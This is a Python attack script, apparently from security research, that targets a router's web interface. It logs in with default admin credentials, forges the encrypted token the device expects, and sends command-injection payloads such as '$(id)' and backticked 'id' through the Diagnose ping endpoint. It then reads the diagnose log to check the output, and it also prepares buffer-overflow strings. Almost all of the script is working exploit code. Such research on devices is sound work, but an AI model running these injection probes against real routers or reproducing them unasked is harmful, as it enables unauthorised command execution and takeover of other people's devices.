#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
import requests
import time
from time import sleep
import json

from Crypto.Cipher import DES3
import binascii

### CONSTANTS
url_base = "http://192.168.1.1"

### ENDPOINTS
endpoint_login = "/1.2.4/cgi-bin/Login"
endpoint_checkauth = "/1.2.4/cgi-bin/GetFwInfo"
endpoint_getkey = "/1.2.4/cgi-bin/GetKey"
endpoint_gettoken = "/1.2.4/cgi-bin/GetToken"
endpoint_ping = "/1.2.4/cgi-bin/Diagnose"
endpoint_getdiagnoselog = "/1.2.4/cgi-bin/GetDiagnoseLog"

headers = {
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9',
	'Connection': 'keep-alive',
	'Content-Type': 'application/json',
	'Host': '192.168.1.1',
	'Origin': 'http://192.168.1.1',
	'Referer': 'http://192.168.1.1/1.2.4/login.html',
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
	'X-Requested-With': 'XMLHttpRequest'
}

def main():
	# admin / admin (appears to be MD5 of plaintext but with some special sauce)
	login_request_data = {
		"UserName": "admin",
		"Password": "d2abaa37a7c3db1137d385e1d8c15fd2",
		"token": ""
	}

	session_id = login(login_request_data)
	if not session_id:
		print("[!] Failed to login. Quitting!")
		exit()

	print(f"[+] Parsed session_id: {session_id}")
	headers['Cookie'] = f"sessionID={session_id}"

	check_auth()
	key = get_key()
	token = get_token()

	token_encrypted = encrypt_token(token, key)
	print(f"[+] Got encrypted token: {token_encrypted}")

	targets_bo = [ 'A'*i for i in range(240,250) ]
	targets_ci = [
		'www.google.com',
		'192.168.1.204',
		'localhost',
		'A'*250+'`id`',
		'$(id)'
	]

	for t in targets_ci:
		ping_request_data = {
			"Method": 0,
			"Target": t,
			"Count": 1,
			"token": token_encrypted
		}

		print()
		print(f"[*] Trying {len(t)} '{t}'...")
		send_ping_get_response(ping_request_data)

def login(login_request_data):
	full_url = url_base + endpoint_login

	headers['Content-Length'] = str(len(json.dumps(login_request_data)))
	fn_request = save_request("login", "POST", full_url, headers, data=login_request_data)
	response = requests.post(full_url, headers=headers, data=json.dumps(login_request_data))

	save_response(fn_request, response)

	return parse_session_id(response)

def parse_session_id(response):
	"""
		Parse session ID from initial login response.
	"""
	cookie_string = response.headers.get('Set-Cookie')
	if not cookie_string:
		return None
	cookie = cookie_string.split("=")[1]

	# Sometimes server returns it this way if invalid
	if cookie.lower() == "none":
		return None

	return cookie

def check_auth():
	# No content length needed since this is a GET
	del headers['Content-Length']

	full_url = url_base + endpoint_checkauth
	fn_request = save_request("GetFwInfo", "GET", full_url, headers)
	response = requests.get(full_url, headers=headers)

	parse_checkauth_response(response)
	save_response(fn_request, response)

def parse_checkauth_response(response):
	try:
		response_json = response.json()
		err = response_json.get("session_id_error")
		if not err:
			print(f"[+] Received checkauth response: {response_json}")
		if err:
			print("[!] Got session_id_error when checking authentication. Quitting!")

	except:
		raise Exception("Got error when trying to parse checkauth response -- maybe no JSON received?")

def parse_gettoken_response(response):
	try:
		response_json = response.json()

		token = response_json.get("token")
		if not token:
			print("[!] Did not get token. Quitting!")

		print(f"[+] Received GetToken response: {response_json}")
		return token

	except:
		raise Exception("Got error when trying to parse gettoken response -- maybe no JSON received?")

def get_token():
	full_url = url_base + endpoint_gettoken
	fn_request = save_request("GetToken", "GET", full_url, headers)
	response = requests.get(full_url, headers=headers)

	token = parse_gettoken_response(response)
	save_response(fn_request, response)

	return token

def get_key():
	full_url = url_base + endpoint_getkey
	fn_request = save_request("GetKey", "GET", full_url, headers)
	response = requests.get(full_url, headers=headers)

	key = parse_getkey_response(response)
	save_response(fn_request, response)

	return key

def parse_getkey_response(response):
	try:
		response_json = response.json()

		key = response_json.get("Key")
		if not key:
			print("[!] Did not get key. Quitting!")

		print(f"[+] Received GetKey response: {response_json}")
		return key

	except:
		raise Exception("Got error when trying to parse GetKey response -- maybe no JSON received?")

def encrypt_token(token, key):
	"""
		Performs token encryption to match the expected format of the server
	"""
	message = token

	# Convert to bytes
	key_bytes = key.encode('utf-8')
	message_bytes = message.encode('utf-8')

	# Create 3DES cipher in ECB mode
	cipher = DES3.new(key_bytes, DES3.MODE_ECB)

	# Encrypt and return as hex string
	encrypted = cipher.encrypt(message_bytes)

	return binascii.hexlify(encrypted).decode('utf-8')

def send_ping_get_response(ping_request_data):
	headers['Content-Length'] = str(len(json.dumps(ping_request_data)))

	full_url = url_base + endpoint_ping
	fn_request = save_request("Ping", "POST", full_url, headers, ping_request_data)
	response = requests.post(full_url, headers=headers, data=json.dumps(ping_request_data))

	save_response(fn_request, response)
	print(response.text)

	if not parse_ping_response(response):
		return

	del headers['Content-Length']

	print("[*] Sleeping 2 seconds to give server time to handle request")
	sleep(2)
	full_url = url_base + endpoint_getdiagnoselog
	fn_request = save_request("GetDiagnoseLog", "GET", full_url, headers)
	response = requests.get(full_url, headers=headers)

	save_response(fn_request, response)
	print(response.text)

def parse_ping_response(response):

	# Catch invalid JSON response
	try:
		response.json()
	except:
		return True

	# Rejected by server
	if response.json().get("FailReason") == "err_0001":
		return False

	return True

def save_request(fn_prefix, method, url, headers, data=None):
	"""
		Utility function to save request data to a file.
	"""
	fn_full     = "requests/" + fn_prefix + "-" + str(time.time())
	request_str = f"{method} {url} HTTP/1.1\n"
	for h in headers:
		request_str += f"{h}: {headers[h]}\n"

	request_str += "\nData:\n"
	request_str += json.dumps(data) + "\n"
	request_str += "-"*32+"\n"

	with open(fn_full, "w") as request_file:
		request_file.write(request_str)

	return fn_full

def save_response(fn_request, response):
	"""
		Utility function to save response data to a given file.
	"""
	response_str = f"Server returned: {response.status_code}\n"
	response_str += "-"*32+"\n"

	for h in response.headers:
		response_str += f"{h}: {response.headers[h]}\n"
	
	response_str += "\nData:\n"
	response_str += response.text + "\n"

	with open(fn_request, "a") as outfile:
		outfile.write(response_str)

	print(f"Wrote response to {fn_request}")

if __name__ == '__main__':
	main()